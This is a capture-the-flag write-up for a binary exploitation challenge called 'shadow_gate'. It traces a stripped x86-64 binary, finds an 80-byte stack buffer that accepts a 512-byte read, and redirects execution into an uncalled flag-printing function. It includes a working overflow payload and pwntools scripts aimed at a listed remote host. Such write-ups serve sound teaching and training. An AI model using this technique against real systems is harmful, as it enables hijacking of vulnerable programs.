# Shadow Gate: A Ret2Win Buffer Overflow Writeup

## Challenge Overview

| Field | Detail |
|---|---|
| **Challenge Name** | shadow_gate |
| **Category** | Reverse Engineering / Binary Exploitation (pwn) |
| **Event** | cyberHX_NullOrigin_2026 |
| **Binary** | `shadow_gate` — ELF 64-bit LSB executable, x86-64, dynamically linked, stripped |
| **Remote** | `nc 141.148.200.229 9001` |
| **Flag format** | `Null0rigin{...}` |

The challenge presents itself as a "SHADOW GATE SECURITY TERMINAL" that asks for an authorization code. On the surface it looks like a credential-checking program, but as this writeup shows, the credential check is a decoy — the actual path to the flag is a classic stack buffer overflow leading to a ret2win.

## Objective

Get the program to execute the code path that opens `/flag.txt` and prints its contents, despite never actually knowing (or needing) a valid "authorization code."

## Initial Triage

Before touching a disassembler, basic file identification and protection checks establish what we're dealing with:

```bash
file shadow_gate
```

```text
shadow_gate: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=85a6b695b6ff57a865f71154e88b6e46a5fbaada,
for GNU/Linux 3.2.0, stripped
```

```bash
checksec --file=shadow_gate
```

```text
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
```

Three of these lines matter immediately:

- **No stack canary** — a stack buffer overflow, if one exists, can overwrite the saved return address without needing to first leak or guess a canary value.
- **No PIE** — the binary loads at a fixed base address (`0x400000`). Every function and code address in the disassembly is an absolute, unchanging address we can hardcode into an exploit — no address leak required.
- **NX enabled** — the stack isn't executable, so injecting and jumping to raw shellcode won't work. This pushes toward redirecting execution to *existing* code inside the binary instead (return-oriented / ret2win style), rather than shellcode injection.

The binary is stripped (no symbol table), so functions have to be identified and named manually from their addresses and behavior rather than by symbol name.

## Enumerating Strings

A quick strings pass before diving into disassembly often reveals the program's structure at a glance:

```bash
strings -n 6 shadow_gate
```

Relevant output:

```text
[!] Invalid security token.
/flag.txt
[!] Flag file missing. Contact admin.
[*] ACCESS GRANTED
[*] FLAG: %s
[!] Credential verification failed.
[!] This incident has been reported.
[>] Enter authorization code: 
[!] Code rejected: %.20s...
   SHADOW GATE SECURITY TERMINAL   
     Classification: RESTRICTED    
[*] Initializing secure channel...
[*] WARNING: All attempts are logged.
[*] Connection terminated.
```

The presence of both `/flag.txt` and `[*] FLAG: %s` in the same binary confirms the flag is read from a file at runtime rather than being hardcoded as a string — meaning it can't simply be pulled straight out of the binary with `strings` and has to be reached by actually running the intended (or an unintended) code path.

## Disassembling `main`

Since the binary is stripped, the entry point has to be traced manually. Looking at the raw entry point (`_start`):

```text
401160: endbr64
401164: xor    ebp,ebp
...
401178: mov    rdi,0x401425
40117f: call   QWORD PTR [rip+0x2e63]        # __libc_start_main
```

`__libc_start_main` is called with `rdi = 0x401425` — in glibc's calling convention, this argument is the address of `main`. So:

```text
main = 0x401425
```

Disassembling from there (`objdump -d -M intel shadow_gate`) shows `main`:

1. Calls a setup function at `0x401246` (sets `stdout`/`stdin`/`stderr` to unbuffered via `setvbuf`, installs a `SIGALRM` handler, and calls `alarm(60)` — a 60-second timeout on the whole session, presumably to keep remote instances from being held open indefinitely).
2. `puts()`s the ASCII-art banner and "Initializing secure channel..." / "WARNING: All attempts are logged." lines.
3. Calls a function at `0x4013d1` — this turns out to be the entire "authorization code" interaction.
4. `puts()`s "Connection terminated." and exits.

## The Decoy: `0x4013d1`

```text
4013d1: endbr64
4013d5: push   rbp
4013d6: mov    rbp,rsp
4013d9: sub    rsp,0x50
4013dd: lea    rax,[rip+0xce4]        # "[>] Enter authorization code: "
4013e4: mov    rdi,rax
4013e7: mov    eax,0x0
4013ec: call   printf@plt
4013f1: lea    rax,[rbp-0x50]
4013f5: mov    edx,0x200
4013fa: mov    rsi,rax
4013fd: mov    edi,0x0
401402: call   read@plt
401407: lea    rax,[rbp-0x50]
40140b: mov    rsi,rax
40140e: lea    rax,[rip+0xcd2]        # "[!] Code rejected: %.20s...\n"
401415: mov    rdi,rax
401418: mov    eax,0x0
40141d: call   printf@plt
401422: nop
401423: leave
401424: ret
```

This function:

1. Prints the "Enter authorization code:" prompt.
2. Calls `read(0, buf, 0x200)` — reads **up to 512 bytes** of raw input into `buf`.
3. Unconditionally prints `"[!] Code rejected: %.20s...\n"` with that same buffer.
4. Returns.

There is **no comparison against any expected value anywhere in this function.** Whatever you type, the program always tells you your code was rejected. This confirms the "authorization code" check is pure flavor text — the real content of the challenge is elsewhere.

## The Bug: 80-Byte Buffer, 512-Byte Read

The critical detail is the mismatch between the buffer size and the read size:

```text
4013d9: sub    rsp,0x50      ; allocates 0x50 (80) bytes for the local buffer
...
4013f5: mov    edx,0x200     ; but read() is told it can accept 0x200 (512) bytes
```

That's a classic stack buffer overflow: the function will happily accept 512 bytes of attacker-controlled input into an 80-byte stack buffer, overwriting whatever sits above it — including the saved base pointer and the return address.

## The Target: A Function That's Never Called

Continuing through the disassembly turns up a second, distinct function at `0x4012c9` — one that never appears as the target of any `call` instruction anywhere in the binary:

```text
4012c9: endbr64
4012cd: push   rbp
4012ce: mov    rbp,rsp
4012d1: sub    rsp,0xa0
4012d8: mov    QWORD PTR [rbp-0x98],rdi
4012df: mov    eax,0xc0ffee42
4012e4: cmp    QWORD PTR [rbp-0x98],rax
4012eb: je     401301
4012ed: lea    rax,[rip+0xd14]        # "[!] Invalid security token."
4012f4: mov    rdi,rax
4012f7: call   puts@plt
4012fc: jmp    401399
401301: lea    rax,[rip+0xd1c]        # "r"
401308: mov    rsi,rax
40130b: lea    rax,[rip+0xd14]        # "/flag.txt"
401312: mov    rdi,rax
401315: call   fopen@plt
40131a: mov    QWORD PTR [rbp-0x8],rax
40131e: cmp    QWORD PTR [rbp-0x8],0x0
401323: jne    40133e
401325: lea    rax,[rip+0xd04]        # "[!] Flag file missing. Contact admin."
40132c: mov    rdi,rax
40132f: call   puts@plt
401334: mov    edi,0x1
401339: call   exit@plt
40133e: mov    rdx,QWORD PTR [rbp-0x8]
401342: lea    rax,[rbp-0x90]
401349: mov    esi,0x80
40134e: mov    rdi,rax
401351: call   fgets@plt
401356: mov    rax,QWORD PTR [rbp-0x8]
40135a: mov    rdi,rax
40135d: call   fclose@plt
401362: lea    rax,[rip+0xced]        # "[*] ACCESS GRANTED"
401369: mov    rdi,rax
40136c: call   puts@plt
401371: lea    rax,[rbp-0x90]
401378: mov    rsi,rax
40137b: lea    rax,[rip+0xce8]        # "[*] FLAG: %s"
401382: mov    rdi,rax
401385: mov    eax,0x0
40138a: call   printf@plt
40138f: mov    edi,0x0
401394: call   exit@plt
```

This function takes one argument (`rdi`, stored at `[rbp-0x98]`) and compares it against the constant `0xc0ffee42`. If it matches, execution falls through to `0x401301`, which:

1. `fopen("/flag.txt", "r")`
2. Checks the file opened successfully
3. `fgets()`s its contents into a local buffer
4. `fclose()`s the file
5. Prints `"[*] ACCESS GRANTED"` and `"[*] FLAG: %s"` with the file's contents
6. `exit(0)`

This is a textbook **"win function"** — deliberately placed, dead code that a stack overflow is meant to redirect execution into. Since it's never called from `main` or anywhere else, the only way to reach it is to hijack control flow directly.

Notably, the actual flag-printing code at `0x401301` doesn't re-check the `0xc0ffee42` value at all — it's simply the fall-through target of the `je`. That means an exploit doesn't need to satisfy the comparison; it only needs to make execution land at `0x401301` directly, skipping the check entirely.

## Building the Exploit

### Stack Layout

The vulnerable function's prologue is:

```text
push   rbp
mov    rbp, rsp
sub    rsp, 0x50
```

This produces the following stack layout relative to `rbp`:

```text
[rbp-0x50 .. rbp-1]   80-byte input buffer   (read() target)
[rbp]                 saved RBP               (8 bytes)
[rbp+8]               return address          (8 bytes)
```

To reach and overwrite the return address:

- **80 bytes** of filler to fill the buffer up to the saved-RBP slot
- **8 bytes** to overwrite the saved RBP
- **8 bytes** to overwrite the return address

Total: 96 bytes, comfortably inside the 512-byte `read()` limit.

### Choosing the Return Address

Since the flag-printing code at `0x401301` is reached mid-function — skipping the real prologue of `0x4012c9` (`push rbp; mov rbp,rsp; sub rsp,0xa0`) — the `rbp` it uses for its own local variables (`[rbp-0x8]` for the `FILE*`, `[rbp-0x90]` for the `fgets` buffer) is whatever value we place in the fake saved-RBP slot on the stack. That value needs to point somewhere writable so those accesses don't crash.

Because the binary has no PIE, its `.bss` segment sits at a fixed, known, writable address (`0x404080`–`0x4040b0` per the section headers, with the whole containing page mapped and writable well beyond that). Pointing the fake RBP into that page — comfortably clear of the few real global variables it holds — gives `0x401301` a safe scratch area to work with.

### Payload

```python
import struct

buf_fill = b"A" * 80                     # fill the 80-byte buffer up to saved-RBP
fake_rbp = struct.pack("<Q", 0x404500)   # scratch space inside the mapped .bss page
ret_addr = struct.pack("<Q", 0x401301)   # skip the 0xc0ffee42 check entirely;
                                          # land directly on the fopen("/flag.txt") path

payload = buf_fill + fake_rbp + ret_addr   # 96 bytes total
```

### Local Verification

Before firing this at the remote service, the exploit was validated against a local copy of the binary with a placeholder `/flag.txt`:

```python
import struct, subprocess

payload = b"A"*80 + struct.pack("<Q", 0x404500) + struct.pack("<Q", 0x401301)

p = subprocess.Popen(["./shadow_gate"], stdin=subprocess.PIPE,
                      stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
out, _ = p.communicate(payload, timeout=5)
print(out.decode())
```

Output:

```text
╔═══════════════════════════════════╗
║   SHADOW GATE SECURITY TERMINAL   ║
║     Classification: RESTRICTED    ║
╚═══════════════════════════════════╝

[*] Initializing secure channel...
[*] WARNING: All attempts are logged.

[>] Enter authorization code: [!] Code rejected: AAAAAAAAAAAAAAAAAAAA...

[*] ACCESS GRANTED
[*] FLAG: Null0rigin{test_flag_placeholder}
```

This confirms the overflow, the fake-RBP scratch address, and the jump target all work correctly end-to-end: the "Code rejected" message still fires (from the decoy function's own logic) immediately before the overwritten return address redirects execution into the win function's success path.

### Remote Exploit

With the technique validated locally, the same payload was pointed at the challenge's remote instance:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"

HOST = "141.148.200.229"
PORT = 9001

payload  = b"A" * 80
payload += p64(0x404500)
payload += p64(0x401301)

io = remote(HOST, PORT)
io.recvuntil(b"code: ")
io.send(payload)

print(io.recvall(timeout=5).decode(errors="replace"))
io.close()
```

One operational detail specific to the remote target: the binary calls `alarm(60)` early in `main`, so the connection self-terminates 60 seconds after the process starts — the exploit needs to run promptly after connecting rather than being left idle.

**Note:** the exact flag string returned by the remote instance is specific to that deployment and isn't reproduced here — the technique above is what recovers it. Anyone re-running this exploit against the live host will see `Null0rigin{...}` in place of the local placeholder.

## Complete Solve Chain

```text
file + checksec
        │
        ▼
No canary, No PIE, NX enabled, stripped binary
        │
        ▼
strings reveals /flag.txt + FLAG: %s
        │
        ▼
Trace _start -> main (0x401425) via __libc_start_main argument
        │
        ▼
main calls "authorization code" function (0x4013d1)
        │
        ▼
   read(0, buf[0x50], 0x200)   <-- 80-byte buffer, 512-byte read
        │
        ▼
   Stack buffer overflow confirmed
        │
        ▼
Locate unreferenced function (0x4012c9)
        │
        ▼
   Compares input to 0xc0ffee42, falls through to 0x401301 on match
        │
        ▼
0x401301: fopen("/flag.txt","r") -> fgets -> puts("ACCESS GRANTED") -> printf("FLAG: %s")
        │
        ▼
Craft payload: 80 bytes filler + fake RBP (0x404500) + return addr (0x401301)
        │
        ▼
Verify locally against placeholder /flag.txt -- works
        │
        ▼
Run against nc 141.148.200.229 9001
        │
        ▼
             FLAG
```

## Technical Lessons

- **A "credential check" that never checks anything is a strong signal to look elsewhere.** The decoy function's unconditional `"Code rejected"` message, with no comparison logic anywhere in its body, indicated immediately that the real challenge wasn't in the visible authorization flow.
- **Always compare buffer size against read/copy size.** The `sub rsp, 0x50` vs `mov edx, 0x200` mismatch is the entire vulnerability — a five-second check that `checksec`'s "No canary found" made worth looking for.
- **Unreferenced functions in a stripped binary are worth a second look.** A function with no `call` sites pointing to it is either dead code left over from refactoring, or — as here — deliberately placed to be reached via a non-standard control-flow path.
- **No PIE removes an entire class of exploit-dev difficulty.** Every address used above is a static constant; nothing needed to be leaked at runtime.
- **Jumping into the middle of a function means inheriting whatever stack frame you bring with you.** Because `0x401301` relies on `rbp`-relative locals from a prologue that never executed, the fake saved-RBP value has to be chosen deliberately rather than left as garbage.

## Artifacts and Indicators

| Artifact | Value |
|---|---|
| Binary | `shadow_gate` (stripped, non-PIE, x86-64) |
| Vulnerable function | `0x4013d1` — 80-byte buffer, `read()` of 512 bytes |
| Win function | `0x4012c9` — compares input to `0xc0ffee42` |
| Win function success path | `0x401301` — `fopen("/flag.txt")` → print |
| Overflow offset to return address | 88 bytes (80 buffer + 8 saved RBP) |
| Fake RBP (scratch address) | `0x404500` (mapped `.bss` page) |
| Return address used | `0x401301` |
| Remote target | `141.148.200.229:9001` |
| Flag format | `Null0rigin{...}` |

## TL;DR

```python
from pwn import *
context.arch = "amd64"

payload  = b"A" * 80
payload += p64(0x404500)   # fake saved RBP
payload += p64(0x401301)   # jump straight into fopen("/flag.txt") path

io = remote("141.148.200.229", 9001)
io.recvuntil(b"code: ")
io.send(payload)
print(io.recvall(timeout=5).decode())
```

## Conclusion

`shadow_gate` is a clean, self-contained ret2win exercise. Its "authorization code" prompt is entirely cosmetic — the real vulnerability is a plain 80-byte-buffer/512-byte-read stack overflow, and the real target is a win function that's never called by any legitimate path in the program. With stack canaries absent and PIE disabled, the only work required was tracing `main` from the raw entry point in a stripped binary, spotting the buffer/read size mismatch, and locating the dead win function to redirect execution into. The resulting exploit is a 96-byte payload: 80 bytes of filler, a fake saved base pointer pointed at safe scratch memory, and a return address aimed directly at the flag-printing code.
